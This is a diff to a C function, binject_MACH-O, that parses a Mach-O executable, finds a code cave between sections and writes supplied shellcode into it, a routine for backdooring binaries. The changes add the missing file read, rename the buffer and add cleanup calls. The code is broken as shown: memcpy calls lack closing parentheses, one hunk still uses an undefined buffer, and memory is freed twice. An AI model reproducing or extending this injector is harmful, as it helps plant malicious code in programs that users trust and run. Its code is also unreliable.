@@ -6,8 +6,9 @@ int binject_MACH-O(char *file,char *shellcode)
   fseek(f,0,SEEK_END);
    size=ftell(f);
    char *file_buffer = calloc(1,size);
-	struct mach_header *header= (struct mach_header*)buf;
-	char *address=buf;
+  fread(file_buffer,1,size,f);
+	struct mach_header *header= (struct mach_header*)file_buffer;
+	char *address=file_buffer;
 	if(header->magic==MH_MAGIC_64)
 	{
 		
@@ -43,8 +44,11 @@ for(uint32_t a=0;a<header->ncmds;a++)
 			uint32_t    cavelen= sectionCommand->offset-caveOffset;
 			if(scfixedlen<cavelen)
 			{
-				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
-				 fwrite(buf,1,size,f);
+				memcpy(file_buffer+cave_offset,shellcodefixed,strlen(shellcodefixed);
+				 fwrite(file_buffer,1,size,f);
+				 free(shellcodefixed);
+				 free(file_buffer);
+				 fclose(f);
 			break;
 		        }    
                     }
@@ -72,6 +76,9 @@ for(uint32_t a=0;a<header->ncmds;a++)
 			{
 				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
 				 fwrite(buf,1,size,f);
+				 free(shellcodefixed);
+				 free(file_buffer);
+				 fclose(f);
 			break;
 		        }    
                     }
@@ -80,6 +87,9 @@ for(uint32_t a=0;a<header->ncmds;a++)
             }
 	}
 				       address+=cmd->cmdsize;
- }                
+ } 
+fclose(f);
+free(shellcodefixed);
+free(file_buffer);
 return -1;				       
 }
